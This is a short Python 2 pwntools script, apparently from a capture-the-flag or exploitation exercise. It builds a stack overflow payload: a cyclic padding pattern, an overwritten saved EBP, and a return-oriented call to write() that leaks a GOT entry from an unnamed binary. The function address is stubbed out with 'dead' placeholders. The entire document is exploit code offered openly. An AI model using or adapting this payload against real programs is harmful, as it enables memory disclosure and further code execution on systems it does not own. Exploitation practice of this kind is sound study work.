from pwn import *
from struct import pack, unpack

buffer  = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A'
buffer += pack('<I', 0x08049620) # leave will use this value for ebp

# write write.plt
#buffer += pack('<I', 0x0804830C) # _write
buffer += "dead"
buffer += "dead"
# write params
buffer += pack('<I', 1)          # fd
buffer += pack('<I', 0x08049614) # write.plt got
buffer += pack('<I', 4)          # size

print buffer

